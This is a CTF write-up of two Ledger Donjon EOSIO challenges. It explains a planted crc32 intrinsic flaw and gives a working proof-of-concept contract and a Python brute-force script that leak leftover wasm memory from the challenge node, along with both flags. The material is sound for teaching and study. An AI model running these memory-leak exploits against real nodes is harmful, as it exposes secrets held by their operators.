---
layout: post
title: "Hacking EOS: Modern Cryptocomputer Ledger Donjon CTF Writeup"
categories: CTF Writeup
permalink: hacking-eos-ledger-donjon-ctf-writeup
author: Robin Jadoul and hyperreality
meta: "Hacking EOS: Modern Cryptocomputer Ledger Donjon CTF Writeup"
tags: Writeup Blockchain Cryptocurrency Smart-Contracts
---

These two challenges in the Hardware/Pwn category of [Ledger Donjon CTF](https://donjon.ledger.com/Capture-the-Fortress/) saw us exploit an EOS node with smart contracts.

## Easy Modern Cryptocomputer (100pts)

> A smart contract seems to be a good place to hide a secret flag. Doesn't it?

We were given a README and a Dockerfile for building a Docker image running a patched [EOSIO](https://en.wikipedia.org/wiki/EOS.IO) node.

EOSIO is a blockchain which can run smart contracts, similar to Ethereum. For our purposes, a key feature of EOSIO is that the smart contracts are compiled [WebAssembly](https://en.wikipedia.org/wiki/WebAssembly) programs that run sandboxed on EOSIO nodes. EOS smart contracts are usually written in C++, but developers can use any programming language that can be compiled to WebAssembly (wasm).

The idea behind this challenge is that a [CRC32](https://en.wikipedia.org/wiki/Cyclic_redundancy_check) intrinsic function has been added to EOSIO nodes, but there might be a problem with it. So the creators have added a secret flag to their node which can be read by smart contracts through the new `get_secret_flag` intrinsic that reads an environment variable. The function is part of the wasm "privileged API", therefore only a system user or a privileged contract on the challenge remote node should be allowed to call it. On the other hand, any user or contract may call the `crc32` function. Since the Dockerfile builds from the latest copy of the EOSIO source code, it looks like we need to abuse the `crc32` function to grab the flag (unless we can find a zero day in EOS ;)).

Here's the patch provided - note that `wasm_interface.cpp` contains intrinsics that can be called from smart contracts such as hash functions:

```cpp
+++ b/libraries/chain/wasm_interface.cpp
@@ -314,6 +314,17 @@ class privileged_api : public context_aware_api {
          });
       }

+      uint32_t get_secret_flag( array_ptr<char> dest, uint32_t length ) {
+         const char *flag = getenv("FLAG");
+         if (!flag) {
+            flag = "No flag provided";
+         }
+         if ((size_t)length >= strlen(flag)) {
+            length = (uint32_t)strlen(flag);
+         }
+         ::memcpy(dest, flag, length);
+         return length;
+      }
 };

 class softfloat_api : public context_aware_api {
@@ -909,6 +920,18 @@ class crypto_api : public context_aware_api {
       void ripemd160(array_ptr<char> data, uint32_t datalen, fc::ripemd160& hash_val) {
          hash_val = encode<fc::ripemd160::encoder>( data, datalen );
       }
+
+      // Implement the same CRC as binascii.crc32 in Python
+      uint32_t crc32(array_ptr<char> data, uint32_t value, uint32_t datalen) {
+         printf("INPUT POINTER: %p\n", &data[0]);
+         value = ~value;
+         for (int i = 0; i < datalen; i++) {
+            value ^= data[i];
+            for (unsigned int bitpos = 0; bitpos < 8; bitpos ++) {
+               value = (value >> 1) ^ (0xEDB88320 & -(value & 1));
+            }
+         }
+         return ~value;
+      }
 };
```

However, it turns out that this "easy" version of the challenge didn't require any memory exploitation. In fact, the main part of this challenge was understanding EOS and figuring out how to get up and running with it.

First, by iterating over blocks on the blockchain of the remote node, we were able to find a smart contract:

```bash
$ curl http://modern-cryptocomputer.donjon-ctf.io:30510/v1/chain/get_block -d '{"block_num_or_id": 223}'
{"timestamp":"2020-10-06T15:54:59.000","producer":"eosio","confirmed":0,"previous":"000000de5cb1cb15e6e2b40f1c2c01b43de1313b154ff2fcd9a6e5d528445f68","transaction_mroot": ...
```

This block contained a WebAssembly program in hex, and associated data. An `actions` array showed that an actor called "flagchecker" is allowed to update the authorisation on the contract. So we were pretty sure we'd stumbled upon the right thing to investigate.

We decompiled the WebAssembly using [wabt](https://github.com/WebAssembly/wabt). This gave messy pseudocode which took some work to untangle, but eventually we were able to find locations in the code which performed CRC32 over input, and compared an input hash to the SHA256 of the flag. We also found that a flag was getting copied to memory location 0x10000 (although we later discovered this was the flag for the hard version of the challenge).

We wanted to start experimenting with calling this contract, and by reading the EOSIO docs, realised that we could deploy the WASM on our local node if we had the contracts' Application Binary Interface (ABI). We were able to extract that from the blockchain also:

```json
{
  "version": "eosio::abi/1.1",
  "types": [],
  "structs": [
    {
      "name": "checkhashflg",
      "base": "",
      "fields": [
        {
          "name": "user",
          "type": "name"
        },
        {
          "name": "hash_flag_hex",
          "type": "string"
        }
      ]
    }
  ],
  "actions": [
    {
      "name": "checkhashflg",
      "type": "checkhashflg",
      "ricardian_contract": ""
    }
  ],
  "tables": [],
  "ricardian_clauses": [],
  "error_messages": [],
  "abi_extensions": [],
  "variants": []
}
```

So the flagchecker contract has a single function, `checkhashflg`, with two parameter, `user` and `hash_flag_hex`.

After following the EOSIO developers' tutorial from [sections 1.4 to 1.6](https://developers.eos.io/welcome/latest/getting-started/development-environment/create-development-wallet), we had a local copy of the node running and could deploy this smart contract to it, using the following invocation:

```bash
$ cleos set contract eosio /opt/eosio/contracts/easy/ -p eosio@active
```

Now the contract was on our own blockchain, we could push an action to it:

```bash
$ cleos push action eosio checkhashflg '{"user": "eosio", "hash_flag_hex": "00"}' -p eosio
executed transaction: 539c06f374427cd51f27f2c4e60151fed6b01b6b7f073bc3b4d080896b1f6a49  104 bytes  791 us
#         eosio <= eosio::checkhashflg          {"user":"eosio","hash_flag_hex":"00"}
>> Hello, eosio! You are not allowed to call this contract.
```

Initially we thought this was an error coming from the node due to an incorrect way we had called the contract (we had faced enough errors already to get to this point), we eventually realised this message was coming from the contract itself. So closer dissasembly of why it was appearing would be required. After some more reading we noticed this bit of decompilation:

```cpp
  h = env_crc32(e, 0, h);
  if (eqz(d[64]:ubyte & 1)) goto B_i;
  f_gb((d + 72)[0]:int);
  label B_i:
  d[27]:int = h;
  if (h != 1226134910) goto B_l;
```

This revealed we needed a username that CRC32's to the value 1226134910. This was easy to bruteforce as "maze".

Finally, we needed to create a "maze" account on our local node and call `checkhashflg` using maze as the principle, and the contract spat out the easy flag:

```bash
$ cleos create account eosio maze EOS87K6LyQ48We4Pyq9zumXHSQjzozLX5A8FHgxEnrrWh955ZSQkd
$ cleos push action eosio checkhashflg '{"user": "maze", "hash_flag_hex": "00"}' -p maze
Error 3050003: eosio_assert_message assertion failure
Error Details:
assertion failure with message: Unexpected SHA256 size
pending console output: Hello, maze! easyflag=CTF{04f5f3fbbc08dac23645890b03dd0d72fed6c5988621e62295610ff23a377e3b}
```


## Hard Modern Cryptocomputer (500pts)

> Normal users are not able to read the secret embedded in the WASM virtual machine. Can you leak it?
You need to solve "Easy Modern Cryptocomputer" before this challenge.

The easy version of the challenge had got us up to the point where we were calling the contract, but we hadn't even exploited anything in the node patch yet, so naturally we reckoned that was the next place to look.

However, it was unclear how we could access the flag. Would we need  escalate to a privileged user? Break out of the WASM sandbox and print out the flag from the stack? Overflow the buffer in the provided contract to leak the flag in memory?

One of the first things we noticed was that `get_secret_flag` is explicitly using `::memcpy`, the `memcpy` in the top-level namespace, rather than a potentially customized `memcpy` of EOS (it turned out that the "custom" memcpy version we saw was actually an intrinsic being exposed to wasm). After testing this and some other simple ideas, we didn't get very far.

Slowly, we became more confident that the exploit had to involve CRC32 over arbitrary memory locations. Since the `crc32` function was a feature of the patched nodes, we could write our own smart contract and call it. But how to abuse this ability? The function looked fine, its API seemingly not too different from other intrinsic hash functions, and we were unable to find any useful resources about the EOSIO WASM sandbox or previous exploitation work on it.

Looking further at differences that might set the `crc32` function apart from intrinsics such as the `sha256` function, we finally identified something suspicious: the function signature.

```cpp
uint32_t crc32(array_ptr<char> data, uint32_t value, uint32_t datalen)
```

It's not immediately obvious, but in all other intrinsics, the `datalen` directly followed `data` as an argument. For the intrinsic hash functions, since the only other argument was an output variable, this was easy to miss.

But, when we dived deeper into the definition for `array_ptr`, we found this:

```cpp
/**
 * class to represent an in-wasm-memory array
 * it is a hint to the transcriber that the next parameter will
 * be a size (in Ts) and that the pair are validated together
 * This triggers the template specialization of intrinsic_invoker_impl
 * @tparam T
 */
template<typename T>
inline array_ptr<T> array_ptr_impl (size_t ptr, size_t length)
```

Jackpot! Rather unintuitively, the `array_ptr` type must be followed by its length parameter, and these values are validated together. This was surprising to us as the usual pattern for this is to combine a buffer and its length in a struct when this kind of validation is important.

What does this give us? It means that we can call `crc32` with `data` pointing to memory inside the WASM sandbox during execution of a contract, `value` set to 0, and `datalen` set to an arbitrary length. Then we can keep reading forwards in memory and taking the CRC32. We can bruteforce CRC32 one value at a time to get memory reads that wouldn't normally be possible, since the data pointer plus the length would spill into memory not allocated for the contract. It's not quite an arbitrary memory read, but it was progress.

We wrote a quick contract to validate that our idea indeed worked:

```cpp
#include <eosio/eosio.hpp>
#include <eosio/crypto.hpp>

using namespace eosio;

extern "C" [[eosio::wasm_import]] uint32_t crc32(const char*, uint32_t, uint32_t);
extern "C" [[eosio::wasm_import]] uint32_t get_secret_flag(const char*, uint32_t);

class [[eosio::contract]] pwn : public contract {
    public:
        using contract::contract;

        [[eosio::action]]
        void pwn(name user) {
            const char *ptr = "bla";
            int out = crc32(ptr, 0, 65537);
            print(out);
        }
};
```

Executing this, we could read some weird stuff in memory after the char pointer.

But then we got stuck. How to get the flag? Since it's an environment variable, it'll be on the stack, but we can still only read allocated memory pages, accessing anything else would result in a segfault. The wasm memory is presumably allocated somewhere on the heap, while the flag is somewhere on the stack, and we're pretty much guaranteed that these will not be contiguous. Trying to reach the stack from where we can start would both be impossible due to the segfaults, as well as being infeasible due to requiring a linear scan over the in-between memory for every byte we can leak.

Interested in how the wasm memory is managed, and where exactly it can be found - still somehow hoping we could get close to the stack somewhere - we dug deeper into the EOS source. With noticeable surprise on our faces, we soon realised that the wasm memory area `Memory::data` is a [static member](https://github.com/EOSIO/wabt/blob/ce5c90e456f004558e123d606a6d1601587f00bc/src/interp.h#L133) (which would also immediately mean that multiple wasm programs cannot or should not be executed in parallel). This implies that the same memory location might be consistent across multiple calls, and hopefully (from an attacker's perspective) [isn't immediately cleared](https://github.com/EOSIO/eos/blob/e19afc8072219282a7c3fc20e47aa80cb70299e4/libraries/chain/webassembly/wabt.cpp#L46) in between runs.

Looking at the source, we saw that all the memory that is *used* or *reserved* is cleared or initialized, but if the `std::vector` is shrunk relative to the last call, it is hopefully not reallocated, and the old data extending past our "fences" is not cleared. Perhaps we could first run the other contract that called the privileged `get_secret_flag`, then read some remnants of memory it left behind? We shouldn't normally be allowed to access that memory due to the in-WASM protections, but we had already found a way to evade them. That would also explain why the flag was loaded into memory at such a specific address (0x10000) by the other contract: that was exactly one wasm *memory page*, the unit in which the wasm memory is measured. We could make sure our own contract needed only a single page, and then read out of bounds from the remnants of the privileged contract on the second page.

We wrote a Python script for bruting memory reads one deployed contract at a time, and pointed it at our last accessible memory address before 0x10000. Note that it could be faster by doing the bruteforce inside the contract itself; but the code was sufficient to get the flag in a few minutes so there was no need to optimise:

```python
import binascii
import subprocess
from subprocess import PIPE

contract = """
#include <eosio/eosio.hpp>
#include <eosio/crypto.hpp>

using namespace eosio;

extern "C" [[eosio::wasm_import]] uint32_t crc32(const char*, uint32_t, uint32_t);
extern "C" [[eosio::wasm_import]] uint32_t get_secret_flag(const char*, uint32_t);

class [[eosio::contract]] pwn : public contract {
    public:
        using contract::contract;

        [[eosio::action]]
        void pwn(name user) {
            const char *ptr = (char *)0xffff;
            uint32_t out = crc32(ptr, 0, POSITION);
            print(out);
        }
};
"""


def publish_contract(contract):
    with open("pwn.cpp", 'w') as f:
        f.write(contract)
    subprocess.run(["eosio-cpp", "pwn.cpp", "-o", "pwn.wasm"])
    subprocess.run(["cleos", "-u", "http://modern-cryptocomputer.donjon-ctf.io:61775/", "set", "contract", "maze", "/opt/eosio/contracts/pwn/", "-p", "maze@active"])
    subp = subprocess.run(["cleos", "-u", "http://modern-cryptocomputer.donjon-ctf.io:61775/", "push", "action", "maze", "hi", '["maze"]', "-p", "maze@active"], stdout=PIPE, stderr=PIPE)
    print(subp.stdout)
    print(subp.stderr)

    output = subp.stdout.strip().split(b"\n")
    crc_res = output[-1].replace(b">", b"")
    crc_res = int(crc_res)
    print(crc_res)
    return crc_res


curr = b""
pos = 0

while True:
    pos += 1
    contract2 = contract.replace("POSITION", str(pos))
    crc_target = publish_contract(contract2)

    for i in range(256):
        temp = curr + bytes([i])
        out = binascii.crc32(temp)
        if out == crc_target:
            curr = curr + bytes([i])
            print(curr)
            break

```

The output of the script shows the flag appearing character by character:

```
Warning, empty ricardian clause file                                                                                                                                                          Warning, empty ricardian clause file
Warning, action <hi> does not have a ricardian contract
Reading WASM from /opt/eosio/contracts/pwn/pwn.wasm...
Skipping set abi because the new abi is the same as the existing abi
Publishing contract...
executed transaction: 895079151c7c45b53a3f7df03d4ab3b39c2cd7aa9152d545a2c6ce4c5eb117cf  632 bytes  1522 us
#         eosio <= eosio::setcode               {"account":"maze","vmtype":0,"vmversion":0,"code":"0061736d0100000001370b6000017f60027f7f0060037f7f7...
warning: transaction executed locally, but may not be confirmed by the network yet         ]
b'#          maze <= maze::hi                     {"user":"maze"}\n>> 9020020\n'
b'executed transaction: 8764d941196b9d4cb4ad979d3ff08aa1b9c998aeb1c9343be6bbe8b7a4bbb121  104 bytes  374 us\nwarn  2020-11-08T22:36:55.034 cleos     main.cpp:513                  print_resul
t         ] \rwarning: transaction executed locally, but may not be confirmed by the network yet\n'
9020020
b'CTF{S3cur1ty_with_C++_TeM'
Warning, empty ricardian clause file
Warning, empty ricardian clause file
Warning, action <hi> does not have a ricardian contract
Reading WASM from /opt/eosio/contracts/pwn/pwn.wasm...
Skipping set abi because the new abi is the same as the existing abi
Publishing contract...
executed transaction: 2583b751da8d72a671d46d1be67bcb0fcd5dfaa9984991d1e20a6ae86b74ac08  632 bytes  1456 us
#         eosio <= eosio::setcode               {"account":"maze","vmtype":0,"vmversion":0,"code":"0061736d0100000001370b6000017f60027f7f0060037f7f7...
warning: transaction executed locally, but may not be confirmed by the network yet         ]
b'#          maze <= maze::hi                     {"user":"maze"}\n>> 3580863030\n'
b'executed transaction: 1df65b055bce13b4932d3d9c6f2b30c9dee82ff818833c6be8b1c9d9c8604c41  104 bytes  487 us\nwarn  2020-11-08T22:37:00.550 cleos     main.cpp:513                  print_resul
t         ] \rwarning: transaction executed locally, but may not be confirmed by the network yet\n'
3580863030
b'CTF{S3cur1ty_with_C++_TeMp'
```

The full flag: `CTF{S3cur1ty_with_C++_TeMpLaTeS_15_fragile}`


